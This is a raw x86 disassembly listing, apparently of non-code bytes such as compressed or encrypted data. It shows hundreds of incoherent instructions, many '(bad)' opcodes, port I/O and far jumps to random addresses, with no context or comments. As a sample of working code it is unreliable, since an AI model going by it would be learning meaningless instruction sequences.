  41ba31:	call   DWORD PTR [eax]
  41ba33:	push   ebp
  41ba34:	imul   edi,DWORD PTR [ebx-0x5e],0xfffffffe
  41ba38:	mov    gs,ecx
  41ba3a:	jb     0x41b9f3
  41ba3c:	fstp   TBYTE PTR ds:0x5ede8e71
  41ba42:	leave  
  41ba43:	in     al,dx
  41ba44:	div    BYTE PTR [esi+ebp*4+0xe]
  41ba48:	out    0x1a,eax
  41ba4a:	push   edi
  41ba4b:	stc    
  41ba4c:	cs mov al,0x78
  41ba4f:	test   eax,0xcba115a6
  41ba54:	sbb    eax,0xfa7d8e92
  41ba59:	mov    ebx,0xb0a28b35
  41ba5e:	bound  ebx,QWORD PTR [ecx+0x8]
  41ba61:	adc    bh,0x75
  41ba64:	ss loope 0x41ba56
  41ba67:	jecxz  0x41ba71
  41ba69:	mov    al,0x69
  41ba6b:	xchg   ebp,ebp
  41ba6d:	fistp  WORD PTR [edx+0x1d2b1d32]
  41ba73:	adc    eax,0x72da2c74
  41ba78:	mov    bh,0xe8
  41ba7a:	sahf   
  41ba7b:	div    DWORD PTR [eax-0x11]
  41ba7e:	leave  
  41ba7f:	or     ch,BYTE PTR ss:[edx-0x6a08e1f1]
  41ba86:	ds xchg edx,eax
  41ba88:	sti    
  41ba89:	stos   BYTE PTR es:[edi],al
  41ba8a:	pop    edx
  41ba8b:	icebp  
  41ba8c:	push   ds
  41ba8d:	cs dec ebp
  41ba8f:	jno    0x41ba24
  41ba91:	rcr    DWORD PTR [edx-0x6f],0x69
  41ba95:	sub    eax,0xbc4c2377
  41ba9a:	adc    eax,0xe9c14a22
  41ba9f:	pushf  
  41baa0:	clc    
  41baa1:	inc    ebp
  41baa2:	neg    al
  41baa4:	pushf  
  41baa5:	inc    edi
  41baa6:	ret    0xa2e3
  41baa9:	dec    ecx
  41baaa:	ret    0x7457
  41baad:	xchg   edx,eax
  41baae:	lock pop esp
  41bab0:	pop    ebx
  41bab1:	dec    edx
  41bab2:	stc    
  41bab3:	jne    0x41ba9b
  41bab5:	adc    al,0xcc
  41bab7:	repnz fcom DWORD PTR [ebx-0x30370bfe]
  41babe:	add    al,0x86
  41bac0:	call   0xf2cabb1a
  41bac5:	les    eax,FWORD PTR [edx+0x71]
  41bac8:	xchg   BYTE PTR [esi-0xe],ah
  41bacb:	jecxz  0x41bab5
  41bacd:	into   
  41bace:	loop   0x41bb44
  41bad0:	xchg   esp,eax
  41bad1:	pop    ebx
  41bad2:	sbb    BYTE PTR es:[esi-0x80],dl
  41bad6:	sub    DWORD PTR [esi-0x11],esi
  41bad9:	pop    es
  41bada:	and    al,cl
  41badc:	out    dx,al
  41badd:	mov    ebx,0x7f1b8cfd
  41bae2:	retf   0x7754
  41bae5:	retf   
  41bae6:	cmp    eax,0x65305754
  41baeb:	mov    eax,ds:0xacb34fcd
  41baf0:	jmp    0x9935:0x36c4aa61
  41baf7:	gs jnp 0x41baf9
  41bafa:	add    DWORD PTR ss:[ebx],esi
  41bafd:	out    0x10,al
  41baff:	arpl   WORD PTR [ebp-0x6],ax
  41bb02:	mov    bl,0x95
  41bb04:	arpl   di,bp
  41bb06:	push   esp
  41bb07:	les    ebp,FWORD PTR [eax]
  41bb09:	jnp    0x41bb73
  41bb0b:	popa   
  41bb0c:	jno    0x41bab3
  41bb0e:	fwait
  41bb0f:	stc    
  41bb10:	gs je  0x41baed
  41bb13:	mov    al,ds:0x7437a3ff
  41bb18:	scas   al,BYTE PTR es:[edi]
  41bb19:	mov    ds:0x534e7767,eax
  41bb1e:	cwde   
  41bb1f:	push   ss
  41bb20:	sub    DWORD PTR [esi+0x59a8434b],esi
  41bb26:	xchg   dx,ax
  41bb28:	je     0x41bb7e
  41bb2a:	pop    edx
  41bb2b:	cld    
  41bb2c:	mov    BYTE PTR [ebx],bh
  41bb2e:	cdq    
  41bb2f:	cmp    dh,BYTE PTR [ecx]
  41bb31:	stos   BYTE PTR es:[edi],al
  41bb32:	push   eax
  41bb33:	jnp    0x41baff
  41bb35:	push   edi
  41bb36:	inc    ebp
  41bb37:	and    cl,cl
  41bb39:	rcl    ebp,0xc9
  41bb3c:	jle    0x41bafa
  41bb3e:	outs   dx,DWORD PTR ds:[esi]
  41bb3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb40:	pop    ebp
  41bb41:	inc    eax
  41bb42:	(bad)  
  41bb43:	push   esi
  41bb44:	test   DWORD PTR [ebx+ebp*8],ebp
  41bb47:	and    eax,0x8976fd41
  41bb4c:	inc    edx
  41bb4d:	jp     0x41bb95
  41bb4f:	mov    ecx,0x7be91cb1
  41bb54:	call   eax
  41bb56:	xor    DWORD PTR [eax-0x49],edx
  41bb59:	xor    eax,0x8ecf5204
  41bb5e:	xchg   ebp,eax
  41bb5f:	or     DWORD PTR ds:0xb247b276,edx
  41bb65:	xchg   edx,eax
  41bb66:	fnstsw WORD PTR [edi-0x7e]
  41bb69:	jbe    0x41bb2c
  41bb6b:	test   DWORD PTR [edi],eax
  41bb6d:	jae    0x41bb68
  41bb6f:	ins    BYTE PTR es:[edi],dx
  41bb70:	popf   
  41bb71:	xlat   BYTE PTR ds:[ebx]
  41bb72:	push   0x47
  41bb74:	dec    ecx
  41bb75:	out    dx,al
  41bb76:	dec    eax
  41bb77:	mov    esp,ss
  41bb79:	mov    esi,0x6641c272
  41bb7e:	dec    ecx
  41bb7f:	sub    dl,0x37
  41bb82:	and    al,0x1c
  41bb84:	rcr    ebp,cl
  41bb86:	rcr    al,cl
  41bb88:	or     BYTE PTR [esp-0x42fdf0c8],ch
  41bb8f:	shl    DWORD PTR [esi+0x7579318c],1
  41bb95:	jmp    0x41bb5f
  41bb97:	outs   dx,BYTE PTR ds:[esi]
  41bb98:	cmp    DWORD PTR [edi+ebx*4],ebx
  41bb9b:	or     eax,0x927ff9b
  41bba0:	push   ecx
  41bba1:	test   BYTE PTR [eax-0x20],bl
  41bba4:	or     ebx,DWORD PTR [ebx-0x21]
  41bba7:	jbe    0x41bb8a
  41bba9:	push   ebx
  41bbaa:	mov    edi,0x2daafb2e
  41bbaf:	fs mov ch,0xcd
  41bbb2:	sbb    ecx,DWORD PTR [edi-0x7a2769cf]
  41bbb8:	xchg   edx,eax
  41bbb9:	pop    es
  41bbba:	jecxz  0x41bb99
  41bbbc:	loopne 0x41bc1f
  41bbbe:	jno    0x41bba4
  41bbc0:	xchg   esi,eax
  41bbc1:	aad    0xe7
  41bbc3:	stos   DWORD PTR es:[edi],eax
  41bbc4:	imul   ecx,DWORD PTR [esi-0x31],0x23c622d8
  41bbcb:	push   eax
  41bbcc:	dec    BYTE PTR [esi+edi*1]
  41bbcf:	mov    ebp,0xf25efee9
  41bbd4:	mov    al,ds:0xb5a40faf
  41bbd9:	(bad)  
  41bbda:	cmp    edx,DWORD PTR ss:[ebx]
  41bbdd:	loop   0x41bbf9
  41bbdf:	jae    0x41bb6e
  41bbe1:	mov    esi,0xee1f9e89
  41bbe6:	xchg   ebp,eax
  41bbe7:	pop    ecx
  41bbe8:	lea    edi,[ebx+ebp*4]
  41bbeb:	test   BYTE PTR [ecx],dl
  41bbed:	icebp  
  41bbee:	push   0x3dde015a
  41bbf3:	jnp    0x41bc1a
  41bbf5:	mov    ds:0xfc974ebf,eax
  41bbfa:	mov    eax,0xa9512b0e
  41bbff:	xor    eax,0xe0efcd11
  41bc04:	or     ebx,DWORD PTR [ecx-0x32]
  41bc07:	pusha  
  41bc08:	xor    DWORD PTR [ebx+eiz*2],eax
  41bc0b:	xor    edi,DWORD PTR [edi+0x44d19df8]
  41bc11:	fidivr DWORD PTR [ebx-0x3e]
  41bc14:	xor    dl,BYTE PTR [ebx+0x2e]
  41bc17:	dec    esp
  41bc18:	adc    al,0xec
  41bc1a:	push   ebx
  41bc1b:	adc    DWORD PTR [eax+0x3b075081],edi
  41bc21:	sub    dl,BYTE PTR [ebx-0x1a1903d8]
  41bc27:	cmp    DWORD PTR [eax],ebx
  41bc29:	cli    
  41bc2a:	pop    eax
  41bc2b:	in     al,dx
  41bc2c:	mov    esi,DWORD PTR ds:0xfd043750
  41bc32:	test   al,ah
  41bc34:	mov    BYTE PTR [edi],ch
  41bc36:	mov    ah,0x64
  41bc38:	aam    0x6a
  41bc3a:	rol    DWORD PTR [ebx+0x75],0xd3
  41bc3e:	sbb    DWORD PTR [esi-0x63],eax
  41bc41:	inc    ebx
  41bc42:	xlat   BYTE PTR ds:[ebx]
  41bc43:	mov    ch,0x57
  41bc45:	sub    al,0x5c
  41bc47:	aad    0x7a
  41bc49:	sbb    esp,edx
  41bc4b:	mov    edx,0x924e990e
  41bc50:	pop    ss
  41bc51:	fwait
  41bc52:	shr    eax,cl
  41bc54:	cmp    eax,0x91d727f6
  41bc59:	cvttps2pi mm5,QWORD PTR [edi-0x35]
  41bc5d:	ja     0x41bc0f
  41bc5f:	adc    edx,DWORD PTR [edx]
  41bc61:	jmp    0xd66d:0x2bbe2015
  41bc68:	push   cs
  41bc69:	xchg   edi,ebp
  41bc6b:	sub    ebp,DWORD PTR [esi]
  41bc6d:	lock pop eax
  41bc6f:	fninit 
  41bc71:	imul   DWORD PTR [edx+ebp*2-0x54df85e2]
  41bc78:	cmp    al,0x2d
  41bc7a:	cmp    cl,BYTE PTR [esp+ebp*1+0x2a5b457e]
  41bc81:	push   ebp
  41bc82:	pop    eax
  41bc83:	cmp    bl,al
  41bc85:	lock adc BYTE PTR [ecx+ecx*8],0xc7
  41bc8a:	dec    esp
  41bc8b:	dec    ebx
  41bc8c:	mov    dh,0x99
  41bc8e:	adc    al,dh
  41bc90:	das    
  41bc91:	or     DWORD PTR [ebx+eiz*4-0x32cf479b],esp
  41bc98:	daa    
  41bc99:	lods   al,BYTE PTR ds:[esi]
  41bc9a:	ins    BYTE PTR es:[edi],dx
  41bc9b:	in     al,dx
  41bc9c:	xor    ecx,DWORD PTR [eax-0x1c265f16]
  41bca2:	(bad)  
  41bca3:	cmp    BYTE PTR [edi-0x28],al
  41bca6:	jle    0x41bc39
  41bca8:	mov    ah,0xaf
  41bcaa:	and    al,0xb5
  41bcac:	push   ss
  41bcad:	int    0xc7
  41bcaf:	sub    eax,0x2a14981b
  41bcb4:	retf   0x8d76
  41bcb7:	mov    esp,0x9159e4cd
  41bcbc:	xchg   ebx,eax
  41bcbd:	push   esi
  41bcbe:	aas    
  41bcbf:	mov    eax,ds:0xfabc1a39
  41bcc4:	ins    BYTE PTR es:[edi],dx
  41bcc5:	push   es
  41bcc6:	or     eax,0xd43eeeb1
  41bccb:	push   ebx
  41bccc:	stc    
  41bccd:	emms   
  41bccf:	sub    dh,BYTE PTR [edx+edx*1-0x6eebc512]
  41bcd6:	xchg   edi,eax
  41bcd7:	mov    bh,0xf5
  41bcd9:	mov    edi,DWORD PTR [edx+eax*1]
  41bcdc:	jmp    0xbc22:0x46a00489
  41bce3:	dec    edi
  41bce4:	mov    eax,0x8b2409d5
  41bce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcea:	xchg   ah,dl
  41bcec:	mov    ds:0x8dc96eaf,al
  41bcf1:	and    eax,0x25819d18
  41bcf6:	jp     0x41bcfe
  41bcf8:	add    esi,ebx
  41bcfa:	mov    bh,BYTE PTR [ebx]
  41bcfc:	dec    ebx
  41bcfd:	sub    BYTE PTR [edx-0x69],bh
  41bd00:	adc    ch,ah
  41bd02:	mov    bl,0x42
  41bd04:	or     esp,ebp
  41bd06:	sbb    BYTE PTR [eax+eax*4+0x484c4312],dl
  41bd0d:	mov    ds,WORD PTR [esi+0x4983cc6d]
  41bd13:	in     eax,0x1a
  41bd15:	inc    ecx
  41bd16:	mov    ds:0xb11ad25f,eax
  41bd1b:	aad    0xc0
  41bd1d:	push   edi
  41bd1e:	inc    esi
  41bd1f:	push   ebx
  41bd20:	add    DWORD PTR [ecx],esp
  41bd22:	shl    BYTE PTR [esi+ebp*2+0x69e66feb],cl
  41bd29:	dec    ebp
  41bd2a:	gs clc 
  41bd2c:	aas    
  41bd2d:	clc    
  41bd2e:	aad    0x7e
  41bd30:	mov    bl,BYTE PTR [ecx]
  41bd32:	(bad)  
  41bd33:	xchg   edi,eax
  41bd34:	and    eax,ebx
  41bd36:	pop    ss
  41bd37:	fstp   TBYTE PTR [ebp+esi*2-0x311f6bcf]
  41bd3e:	push   esp
  41bd3f:	and    dh,BYTE PTR [eax+esi*2+0x22]
  41bd43:	out    dx,al
  41bd44:	and    BYTE PTR [eax+0x1663d67b],dl
  41bd4a:	inc    eax
  41bd4b:	dec    ecx
  41bd4c:	xchg   esp,eax
  41bd4d:	or     cl,BYTE PTR [ebp-0x62]
  41bd50:	xchg   DWORD PTR [ecx+ebx*2],ebx
  41bd53:	push   ds
  41bd54:	rcr    bl,0x40
  41bd57:	adc    dl,BYTE PTR [ebp+0x14]
  41bd5a:	pop    edx
  41bd5b:	sbb    al,0xb0
  41bd5d:	call   0xf41afc49
  41bd62:	sbb    esi,ecx
  41bd64:	push   ss
  41bd65:	ja     0x41bd2a
  41bd67:	sbb    DWORD PTR [edx+ebx*1-0x45],ebx
  41bd6b:	push   ebx
  41bd6c:	inc    ebp
  41bd6d:	mov    dh,al
  41bd6f:	test   DWORD PTR [edx],0x7b43d035
  41bd75:	and    eax,0x23cb2f73
  41bd7a:	add    bl,BYTE PTR [edx]
  41bd7c:	mov    edi,0xccb5204a
  41bd81:	mov    ebp,0x84965ef3
  41bd86:	pop    es
  41bd87:	jle    0x41bdfa
  41bd89:	add    al,0x59
  41bd8b:	js     0x41bd6c
  41bd8d:	mov    ebp,0x63161b52
  41bd92:	sub    ch,0x3b
  41bd95:	lods   eax,DWORD PTR ds:[esi]
  41bd96:	leave  
  41bd97:	push   eax
  41bd98:	lock push ecx
  41bd9a:	jecxz  0x41bd75
  41bd9c:	xchg   ebp,eax
  41bd9d:	mov    WORD PTR [eax-0x6f3fb12b],gs
  41bda3:	ins    BYTE PTR es:[edi],dx
  41bda4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda5:	aam    0x90
  41bda7:	icebp  
  41bda8:	sbb    eax,0x77677ac3
  41bdad:	out    0xc5,al
  41bdaf:	outs   dx,BYTE PTR ds:[esi]
  41bdb0:	push   ebx
  41bdb1:	or     DWORD PTR [esi],esi
  41bdb3:	gs cmp eax,0xecd7cd93
  41bdb9:	inc    esp
  41bdba:	mov    ebx,0xaf800452
  41bdbf:	add    BYTE PTR [edi-0x1a],cl
  41bdc2:	push   esi
  41bdc3:	sbb    eax,0x579f623
  41bdc8:	mov    BYTE PTR [edx-0xa4cda9e],0xb8
  41bdcf:	adc    ah,BYTE PTR [ecx-0x23]
  41bdd2:	arpl   WORD PTR [eax-0x17],si
  41bdd5:	jb     0x41be40
  41bdd7:	imul   eax,DWORD PTR [ebx-0x4f],0x200957a4
  41bdde:	fscale 
  41bde0:	repz loopne 0x41bd9f
  41bde3:	ds dec ebx
  41bde5:	jb     0x41bd6e
  41bde7:	shl    DWORD PTR [ebp+0x57add222],cl
  41bded:	daa    
  41bdee:	xor    eax,0x1303ffae
  41bdf3:	lahf   
  41bdf4:	je     0x41bda7
  41bdf6:	daa    
  41bdf7:	lahf   
  41bdf8:	xor    esi,ebx
  41bdfa:	lods   al,BYTE PTR ds:[esi]
  41bdfb:	jo     0x41be53
  41bdfd:	mov    cl,ch
  41bdff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be00:	mov    ch,0xb
  41be02:	dec    eax
  41be03:	xchg   eax,eax
  41be05:	(bad)  
  41be06:	and    al,BYTE PTR [esi]
  41be08:	stos   DWORD PTR es:[edi],eax
  41be09:	inc    esi
  41be0a:	sub    eax,0x13b21d97
  41be0f:	in     eax,dx
  41be10:	nop
  41be11:	push   edx
  41be12:	sbb    eax,ebx
  41be14:	and    BYTE PTR [ecx+0x3fd296be],ch
  41be1a:	sub    edi,DWORD PTR [edi+0x3f]
  41be1d:	data16 (bad) 
  41be1f:	jbe    0x41be9e
  41be21:	sbb    eax,0xf173b1ca
  41be26:	mov    al,ds:0x8ed9b428
  41be2b:	or     al,0xdc
  41be2d:	mov    eax,ds:0x8f753a21
  41be32:	shl    DWORD PTR [ecx+0x56],cl
  41be35:	lock jle 0x41be14
  41be38:	dec    esp
  41be39:	outs   dx,BYTE PTR ds:[esi]
  41be3a:	jecxz  0x41bea6
  41be3c:	pop    ebx
  41be3d:	in     al,0xaf
  41be3f:	(bad)  
  41be40:	push   esp
  41be41:	nop
  41be42:	lea    edx,[ebx-0x2363eb0b]
  41be48:	mov    ch,0xff
  41be4a:	sti    
  41be4b:	mov    ecx,edi
  41be4d:	inc    ebp
  41be4e:	aaa    
  41be4f:	sbb    DWORD PTR [esi],ebp
  41be51:	push   ds
  41be52:	dec    eax
  41be53:	mov    WORD PTR [eax-0x74fbb24],ds
  41be59:	and    al,0x96
  41be5b:	inc    esi
  41be5c:	or     eax,0x23a796a0
  41be61:	test   al,0x25
  41be63:	rcr    BYTE PTR ds:0x3ccc37aa,cl
  41be69:	std    
  41be6a:	xor    BYTE PTR [ebx+0x456bd3b],bl
  41be70:	xor    BYTE PTR [eax+0x30],ch
  41be73:	outs   dx,BYTE PTR ds:[esi]
  41be74:	out    dx,eax
  41be75:	stos   DWORD PTR es:[edi],eax
  41be76:	inc    ecx
  41be77:	mov    ds:0xa5be6a7a,al
  41be7c:	xchg   ecx,eax
  41be7d:	xor    BYTE PTR [ebx+edx*4+0x54],0x73
  41be82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be83:	ret    0xc251
  41be86:	sub    al,0x57
  41be88:	mov    al,ds:0xdb6d36d6
  41be8d:	(bad)  
  41be8e:	xlat   BYTE PTR ds:[ebx]
  41be8f:	pop    ebx
  41be90:	es js  0x41be1b
  41be93:	jae    0x41beed
  41be95:	or     eax,0x8ba1e6a6
  41be9a:	xchg   ebx,eax
  41be9b:	(bad)  
  41be9c:	popa   
  41be9d:	mov    dh,0x54
  41be9f:	mov    eax,ds:0x630e049c
  41bea4:	rcl    edi,cl
  41bea6:	cmp    esp,esp
  41bea8:	inc    edi
  41bea9:	das    
  41beaa:	add    al,0xb2
  41beac:	mov    bl,0xc3
  41beae:	dec    esp
  41beaf:	(bad)  
  41beb1:	mov    ebx,0xf58b456f
  41beb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb7:	xor    ah,ah
  41beb9:	jnp    0x41bf2d
  41bebb:	mov    ebx,0xeb4b582f
  41bec0:	push   ds
  41bec1:	add    BYTE PTR [edi-0x65],0x31
  41bec5:	sbb    al,0x28
  41bec7:	xlat   BYTE PTR ds:[ebx]
  41bec8:	out    0x29,eax
  41beca:	dec    esi
  41becb:	leave  
  41becc:	imul   esi,DWORD PTR [eax],0x710cef4a
  41bed2:	jp     0x41bf34
  41bed4:	dec    ecx
  41bed5:	adc    ecx,0x6c4f00ba
  41bedb:	popa   
  41bedc:	dec    edx
  41bedd:	pop    es
  41bede:	pop    esi
  41bedf:	retf   0x9b83
  41bee2:	js     0x41bed4
  41bee4:	popa   
  41bee5:	or     ch,ch
  41bee7:	sub    DWORD PTR [ecx+0x38],edi
  41beea:	(bad)  
  41beeb:	mov    ebp,0xa92c0764
  41bef0:	les    eax,FWORD PTR [eax-0xf]
  41bef3:	mov    dl,0x66
  41bef5:	add    ebx,DWORD PTR [edi*4-0x1d1152db]
  41befc:	out    0x39,eax
  41befe:	push   ecx
  41beff:	or     esp,eax
  41bf01:	add    dl,BYTE PTR [eax]
  41bf03:	and    esp,DWORD PTR [eax-0x60]
  41bf06:	je     0x41befd
  41bf08:	inc    ecx
  41bf09:	dec    ebx
  41bf0a:	push   0xffffffde
  41bf0c:	fldenv [eax]
  41bf0e:	test   DWORD PTR [edi-0x482cf072],esp
  41bf14:	mul    DWORD PTR [edi+ebp*1-0x19]
  41bf18:	popf   
  41bf19:	and    ch,ch
  41bf1b:	dec    edi
  41bf1c:	arpl   WORD PTR [ebx-0x154f93f2],si
  41bf22:	mov    ds,WORD PTR [ecx]
  41bf24:	fcmovnbe st,st(0)
  41bf26:	icebp  
  41bf27:	pushf  
  41bf28:	mov    ch,0x8a
  41bf2a:	rol    DWORD PTR [ecx+edx*2+0x48],1
  41bf2e:	adc    BYTE PTR [ecx+0x7dc2d8e2],0xaa
  41bf35:	ret    0x37be
  41bf38:	popf   
  41bf39:	push   ebx
  41bf3a:	scas   al,BYTE PTR es:[edi]
  41bf3b:	push   ecx
  41bf3c:	push   ebp
  41bf3d:	(bad)  
  41bf3e:	ins    DWORD PTR es:[edi],dx
  41bf3f:	test   BYTE PTR [ebx],ch
  41bf41:	add    DWORD PTR [eax],ebx
  41bf43:	(bad)  
  41bf44:	xchg   ecx,eax
  41bf45:	aaa    
  41bf46:	sti    
  41bf47:	cld    
  41bf48:	aad    0xe3
  41bf4a:	sub    esi,DWORD PTR [eax]
  41bf4c:	mov    ah,0x7a
  41bf4e:	dec    esi
  41bf4f:	das    
  41bf50:	mov    gs:0x5cef3e04,eax
  41bf56:	adc    al,0xff
  41bf58:	ret    
  41bf59:	ficom  WORD PTR [esi-0x7e824e5d]
  41bf5f:	mov    bh,0xe2
  41bf61:	clc    
  41bf62:	adc    al,0x7f
  41bf64:	push   ebp
  41bf65:	loope  0x41bf4b
  41bf67:	aas    
  41bf68:	add    eax,DWORD PTR [edx+0x4bd726df]
  41bf6e:	cmc    
  41bf6f:	xchg   edx,eax
  41bf70:	sub    esi,0xffffffca
  41bf73:	daa    
  41bf74:	call   0x4e7c8dfa
  41bf79:	hlt    
  41bf7a:	fnstenv [ebx]
  41bf7c:	clc    
  41bf7d:	pop    ss
  41bf7e:	(bad)  
  41bf7f:	icebp  
  41bf80:	push   es
  41bf81:	fistp  QWORD PTR [ebx+0x24de8656]
  41bf87:	pop    esp
  41bf88:	or     bl,BYTE PTR [ebx]
  41bf8a:	mov    ?,WORD PTR [ecx+edi*1]
  41bf8d:	xor    eax,0x43cec74
  41bf92:	mov    bh,0x68
  41bf94:	mov    al,0xba
  41bf96:	or     bh,BYTE PTR [eax+0x1b]
  41bf99:	out    0xe,eax
  41bf9b:	cmp    DWORD PTR [ebx+0x4b],ecx
  41bf9e:	out    0xd7,eax
  41bfa0:	jg     0x41c004
  41bfa2:	outs   dx,BYTE PTR ds:[esi]
  41bfa3:	dec    esi
  41bfa4:	mov    esi,0xfd3254af
  41bfa9:	stos   DWORD PTR es:[edi],eax
  41bfaa:	jo     0x41bf67
  41bfac:	lea    ebp,[eax]
  41bfae:	xchg   BYTE PTR [ebp-0x22],cl
  41bfb1:	retf   
  41bfb2:	push   0x23
  41bfb4:	adc    eax,0xf22d9c6b
  41bfb9:	out    dx,eax
  41bfba:	xlat   BYTE PTR ds:[ebx]
  41bfbb:	dec    esp
  41bfbc:	dec    ebp
  41bfbd:	mov    bl,BYTE PTR [ecx]
  41bfbf:	pop    edi
  41bfc0:	adc    BYTE PTR [edi-0x5ebe3fd2],dh
  41bfc6:	icebp  
  41bfc7:	adc    esi,DWORD PTR [edx]
  41bfc9:	inc    esi
  41bfca:	sub    al,0x58
  41bfcc:	jno    0x41bfd4
  41bfce:	or     eax,0x5784d737
  41bfd3:	add    BYTE PTR [edi],bl
  41bfd5:	push   ecx
  41bfd6:	test   bh,dh
  41bfd8:	fs pusha 
  41bfda:	mov    edi,0xa3cbf0fe
  41bfdf:	(bad)  
  41bfe0:	ror    ah,0x19
  41bfe3:	sar    DWORD PTR [edx-0x2c062cbf],cl
  41bfe9:	loopne 0x41c05a
  41bfeb:	add    esp,ebx
  41bfed:	bound  esp,QWORD PTR [edi+0x1e]
  41bff0:	sub    BYTE PTR [edi-0x7f401be5],0x6e
  41bff7:	dec    esi
  41bff8:	add    BYTE PTR [edi+0x6d],cl
  41bffb:	js     0x41bfcb
  41bffd:	xchg   ebx,eax
  41bffe:	loop   0x41c020
  41c000:	(bad)  
  41c001:	call   0x9f61:0xd2ac5e87
  41c008:	xlat   BYTE PTR ds:[ebx]
  41c009:	mov    BYTE PTR [ecx],cl
  41c00b:	mov    ax,ds:0x80e02c7a
  41c011:	push   ebp
  41c012:	dec    edi
  41c013:	jnp    0x41c01d
  41c015:	mov    dh,0x78
  41c017:	inc    eax
  41c018:	push   esp
  41c019:	xchg   esi,eax
  41c01a:	fwait
  41c01b:	mov    cs:0xa559948c,eax
  41c021:	stos   DWORD PTR es:[edi],eax
  41c022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c023:	daa    
  41c024:	push   ds
  41c025:	jge    0x41c05f
  41c027:	mov    ecx,0xb28000eb
  41c02c:	rol    BYTE PTR [eax-0x25],0xc5
  41c030:	and    al,0x9f
  41c032:	lds    ebp,FWORD PTR [esi+0x3]
  41c035:	test   dl,bh
  41c037:	push   es
  41c038:	sub    DWORD PTR [ecx-0x33],edx
  41c03b:	aaa    
  41c03c:	std    
  41c03d:	xor    eax,0x34d6dfb7
  41c042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c043:	test   al,0x5e
  41c045:	retf   0xeb3f
  41c048:	stos   DWORD PTR es:[edi],eax
  41c049:	sub    bh,al
  41c04b:	popa   
  41c04c:	in     eax,dx
  41c04d:	cmp    al,0x5b
  41c04f:	cvtdq2ps xmm6,xmm7
  41c052:	cmp    al,0xcb
  41c054:	out    0x71,eax
  41c056:	or     bh,BYTE PTR [edx]
  41c058:	cmovnp esp,DWORD PTR [edi]
  41c05b:	jne    0x41c0a6
  41c05d:	popa   
  41c05e:	and    eax,ebp
  41c060:	or     eax,0x51fbaf3b
  41c065:	adc    al,0xab
  41c067:	(bad)  
  41c068:	in     al,dx
  41c069:	mov    esp,0xa1962c3
  41c06e:	jle    0x41bffb
  41c070:	xchg   esi,eax
  41c071:	rcr    BYTE PTR [edi],cl
  41c073:	pop    esp
  41c074:	scas   al,BYTE PTR es:[edi]
  41c075:	mov    eax,ds:0x1c6f868b
  41c07a:	and    al,0xe1
  41c07c:	push   ds
  41c07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c07e:	ret    0x75f8
  41c081:	push   0xffffffda
  41c083:	dec    edx
  41c084:	popf   
  41c085:	ins    DWORD PTR es:[edi],dx
  41c086:	xchg   ebx,eax
  41c087:	mov    ds:0x56662d8c,eax
  41c08c:	pop    edx
  41c08d:	into   
  41c08e:	dec    ebx
  41c08f:	test   al,0x76
  41c091:	(bad)  
  41c092:	xlat   BYTE PTR ds:[ebx]
  41c093:	(bad)  
  41c095:	fcomp  QWORD PTR [ebx+0x2c723156]
  41c09b:	dec    ebx
  41c09c:	and    bh,BYTE PTR fs:[ebp-0x430b249d]
  41c0a3:	mov    ch,ah
  41c0a5:	mov    eax,ds:0x6893fd16
  41c0aa:	bound  edx,QWORD PTR [ebp+0x48b9da33]
  41c0b0:	push   edx
  41c0b1:	xor    BYTE PTR [edi+0x76d357b1],dh
  41c0b7:	jae    0x41c133
  41c0b9:	sub    ah,ah
  41c0bb:	(bad)  
  41c0bc:	lea    esp,[esi+0x33]
  41c0bf:	mov    ecx,0x522bb911
  41c0c4:	outs   dx,BYTE PTR ds:[esi]
  41c0c5:	mov    esi,0x8c635fb
  41c0ca:	and    DWORD PTR [edi+0x4d],0xa9802e0
  41c0d1:	fadd   DWORD PTR [eax-0x58]
  41c0d4:	int    0x9e
  41c0d6:	push   ds
  41c0d7:	mov    ebp,0x129be6f1
  41c0dc:	push   eax
  41c0dd:	inc    edx
  41c0de:	push   ebp
  41c0df:	leave  
  41c0e0:	dec    edi
  41c0e1:	arpl   sp,bx
  41c0e3:	sar    BYTE PTR [esi-0x6f],0x56
  41c0e7:	arpl   WORD PTR [ebx],dx
  41c0e9:	dec    eax
  41c0ea:	fcomp  QWORD PTR [edx+0x46]
  41c0ed:	add    DWORD PTR [edi],ebx
  41c0ef:	nop
  41c0f0:	ss push ebp
  41c0f2:	xchg   DWORD PTR [ebx+0x61],eax
  41c0f5:	adc    eax,0x516d8cbd
  41c0fa:	int    0xbd
  41c0fc:	add    esp,0xfe689574
  41c102:	pop    eax
  41c103:	mov    BYTE PTR [ebp+0x25112f8b],dh
  41c109:	push   ds
  41c10a:	(bad)  ds:0xcb49a81e
  41c110:	xchg   ecx,eax
  41c111:	fs or  al,0x17
  41c114:	add    edx,DWORD PTR [esi+0x0]
  41c117:	test   eax,0x68b9f7e7
  41c11c:	loop   0x41c112
  41c11e:	mov    edx,0xe42f9278
  41c123:	and    BYTE PTR [ebx],ch
  41c125:	pop    edx
  41c126:	xchg   edx,eax
  41c127:	inc    ecx
  41c128:	mov    ebp,0x30920b3b
  41c12d:	int3   
  41c12e:	jne    0x41c157
  41c130:	lea    esp,[eax]
  41c132:	(bad)  
  41c133:	dec    ebp
  41c134:	push   esp
  41c135:	add    al,0x5c
  41c137:	sahf   
  41c138:	mov    al,al
  41c13a:	shl    BYTE PTR [esi],1
  41c13c:	mov    bh,0x9
  41c13e:	stc    
  41c13f:	pop    eax
  41c140:	adc    ah,BYTE PTR [ebx-0x28]
  41c143:	jmp    0xd881f4e8
  41c148:	dec    esi
  41c149:	xchg   esi,eax
  41c14a:	mov    bl,0xa2
  41c14c:	and    dh,BYTE PTR [ebp-0x44f8e415]
  41c152:	call   0x45873ddb
  41c157:	mov    gs,WORD PTR [esi-0x74]
  41c15a:	push   ecx
  41c15b:	mov    dl,BYTE PTR [edx]
  41c15d:	retf   0x89e
  41c160:	clc    
  41c161:	lock add ecx,ecx
  41c164:	mov    ebx,eax
  41c166:	popf   
  41c167:	or     eax,0xa474bc02
  41c16c:	push   esi
  41c16d:	jo     0x41c150
  41c16f:	mov    WORD PTR [eax+0x1a464e2d],cs
  41c175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
